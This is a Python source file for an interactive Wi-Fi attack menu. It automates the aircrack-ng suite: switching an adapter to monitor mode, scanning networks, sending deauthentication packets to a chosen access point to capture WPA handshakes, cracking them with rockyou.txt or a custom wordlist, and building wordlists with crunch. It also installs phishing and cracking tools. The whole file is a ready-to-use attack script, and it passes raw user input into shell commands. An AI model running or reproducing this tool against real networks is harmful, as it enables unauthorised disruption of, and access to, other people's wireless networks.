import os
import time
from functions import banner, is_crunch
from termcolor import colored

enter = "\n"

def menu():
    os.system("clear")

    print(colored(f"{banner()}", "red"))

    print(f"*** The Script was Created By TraiLeR (Idan) ***{enter}")

    print("""Menu:
    (1) Enable Monitor Mode
    (2) Disable Monitor Mode
    (3) Scan Networks
    (4) Getting Handshake
    (5) Update & Upgrade Machine
    (6) Install wireless tools (Type 5 before)
    (7) Crack Wi-Fi with rockyou.txt
    (8) Crack Wi-Fi with wordlist (Any)
    (9) Create a wordlist (Crunch Needed)
    (10) About the Hacker
    (11) Exit""")

    option = int(input(f"{enter}Choice > "))

    if option == 11:
        exit()

    elif option == 10:
        print("""
Hi, my name is Idan (TraiLeR) and I am an Ethical Hacker, Bug Bounty Hunter and Cyber Security Researcher.
Since I was a child I loved challenges and do things that would open my mind and be more creative.
Feel free to reach me on LinkedIn:
https://www.linkedin.com/in/idan-malihi-b993611aa/

OR

Feel free to reach me on Telegram:
@TraiLeR30
        """)

    elif option == 1:
        os.system("clear")
        print(f"Set up the adapter{enter}")
        adapter = input("Enter your adapter's name > ")
        os.system(f"ifconfig {adapter} down && iwconfig {adapter} mode monitor && ifconfig {adapter} up && airmon-ng check kill")
        menu()

    elif option == 2:
        os.system("clear")
        adapter = input("Enter your adapter's name > ")
        os.system(f"ifconfig {adapter} down && iwconfig {adapter} mode managed && ifconfig {adapter} up")
        menu()

    elif option == 3:
        os.system("clear")
        adapter = input("Enter your adapter's name > ")
        scan = f"airodump-ng {adapter} -M"
        print(colored("Press CTRL + C When you Finish the SCAN! *IMPORTANT*", "red"))
        time.sleep(5)
        os.system(scan)
        time.sleep(5)
        menu()

    elif option == 4:
        os.system("clear")
        adapter = input("Enter your adapter's name > ")
        scan = f"airodump-ng {adapter} -M"
        print(colored("Press CTRL + C When you Finish the SCAN! *IMPORTANT*", "red"))
        time.sleep(5)
        os.system(scan)
        bssid = str(input(f"{enter}Enter Target's BSSID > "))
        channel = int(input(f"{enter}Enter Network's Channel > "))
        path = str(input(f"{enter}Where to save the Handshake > "))
        packet = int(input("Enter the number of packets [30-100] > "))
        attack = f"airodump-ng {adapter} --bssid {bssid} -c {channel} -w {path} | xterm -e aireplay-ng -0 {packet} -a {bssid} {adapter}"
        os.system(attack)
        menu()

    elif option == 5:
        os.system("clear")
        os.system("sudo apt-get update && sudo apt-get full-upgrade -y")
        menu()

    elif option == 6:
        os.system("clear")
        print("""
(1) Aircrack-ng
(2) Wifite
(3) Kismet
(4) Wifiphisher
(5) inSSIDer
(6) Wireshark
(7) Airgeddon
(8) Wifi Honey
(9) Crunch
(10) Install ALL
            """)

        tool = int(input("Enter the number of the tool > "))

        if tool == 1:
            os.system("sudo apt-get update && sudo apt-get install aircrack-ng -y")

        elif tool == 2:
            os.system("sudo apt-get update && sudo apt-get install wifite -y")

        elif tool == 3:
            os.system("sudo apt-get update && sudo apt-get install kismet -y")

        elif tool == 4:
            os.system("sudo apt-get update && sudo apt-get install wifiphisher -y")

        elif tool == 5:
            os.system("sudo apt-get update && sudo apt-get install linssid -y")

        elif tool == 6:
            os.system("sudo apt-get update && sudo apt-get install wireshark -y")

        elif tool == 7:
            os.system("sudo apt-get update && sudo apt-get install airgeddon -y")

        elif tool == 8:
            os.system("sudo apt-get update && sudo apt-get install wifitap")

        elif tool == 9:
            os.system("sudo apt-get update && sudo apt-get install -y crunch")

        elif tool == 10:
            os.system("sudo apt-get update && sudo apt-get install -y aircrack-ng wifite kismet wifiphisher linssid wireshark airgeddon wifitap")

        else:
            print("You did not type the right number on the list!")

    elif option == 7:
        os.system("clear")
        if os.path.exists("/usr/share/wordlists/rockyou.txt"):
            handshake = str(input("Enter the path of the handshake file > "))
            print(f"{enter}To exit Press CTRL +C")
            os.system(f"aircrack-ng {handshake} -w /usr/share/wordlists/rockyou.txt")
            time.sleep(5)
            exit()

        else:
            os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
            handshake = str(input("Enter the path of the handshake file > "))
            print(f"{enter}To exit Press CTRL +C")
            os.system(f"aircrack-ng {handshake} -w /usr/share/wordlists/rockyou.txt")
            time.sleep(5)
            exit()

    elif option == 8:
        os.system("clear")
        handshake = str(input("Enter the path of the handshake file > "))
        wordlist = str(input("Enter the path of the wordlist file > "))
        os.system(f"aircrack-ng {handshake} -w {wordlist}")

    elif option == 9:
        os.system("clear")
        pattern = str(input("Would you like to create a wordlist with a pattern? [Y]es / [N]o > "))
        if pattern == "N":
            if is_crunch():
                print(colored(f"{enter}The maximum and minimum length should be the same size as the pattern you specified!!{enter}", "red"))

                min = int(input("Minimum of characters > "))
                max = int(input("Maximum of characters > "))
                characters = input("Characters > ")
                output = str(input("File Name (wordlist.txt) > "))

                os.system(f"crunch {min} {max} {characters} -o /root/Desktop/{output}")
                print(f"{enter}Your new wordlist saved in /root/Desktop/{output}")

            else:
                print(f"Installing Crunch{enter}")
                os.system("sudo apt-get update && sudo apt-get install -y crunch")

                print(colored(f"{enter}The maximum and minimum length should be the same size as the pattern you specified!!{enter}", "red"))

                min = int(input("Minimum of characters > "))
                max = int(input("Maximum of characters > "))
                characters = input("Characters > ")
                output = str(input("File Name (wordlist.txt) > "))

                os.system(f"crunch {min} {max} {characters} -o /root/Desktop/{output}")
                print(f"{enter}Your new wordlist saved in /root/Desktop/{output}")

        elif pattern == "Y":
            if is_crunch():
                print(colored(f"{enter}The maximum and minimum length should be the same size as the pattern you specified!!{enter}", "red"))

                min = int(input("Minimum of characters > "))
                max = int(input("Maximum of characters > "))
                characters = input("Characters > ")
                pattern = input("Pattern (Example: a@@@@b) > ")
                output = str(input("File Name (wordlist.txt) > "))

                os.system(f"crunch {min} {max} {characters} -o /root/Desktop/{output} -t {pattern}")
                print(f"{enter}Your new wordlist saved in /root/Desktop/{output}")

            else:
                print(f"Installing Crunch{enter}")
                os.system("sudo apt-get update && sudo apt-get install -y crunch")

                print(colored(f"{enter}The maximum and minimum length should be the same size as the pattern you specified!!{enter}", "red"))

                min = int(input("Minimum of characters > "))
                max = int(input("Maximum of characters > "))
                characters = input("Characters > ")
                pattern = input("Pattern (Example: a@@@@b) > ")
                output = str(input("File Name (wordlist.txt) > "))

                os.system(f"crunch {min} {max} {characters} -o /root/Desktop/{output} -t {pattern}")
                print(f"{enter}Your new wordlist saved in /root/Desktop/{output}")

        else:
            print("Type [Y]es / [N]o !")
            exit()

    else:
        print("Please type the number from the list!")


menu()
